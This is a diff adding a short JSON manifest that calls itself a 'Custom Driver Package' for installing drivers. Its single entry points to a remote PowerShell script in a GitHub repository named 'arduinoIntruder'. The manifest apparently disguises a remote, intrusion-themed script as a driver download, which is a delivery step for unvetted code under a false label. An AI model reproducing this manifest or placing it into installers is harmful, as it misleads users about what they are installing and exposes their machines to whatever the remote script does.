@@ -1,0 +1,11 @@
+{
+  "version": "1.0.0",
+  "name": "Custom Driver Package",
+  "description": "Package for installing drivers.",
+  "architectures": [
+      {
+          "name": "Custom Driver",
+          "url": "https://raw.githubusercontent.com/yes-basic/arduinoIntruder/refs/heads/main/script.ps1"
+      }
+  ]
+}
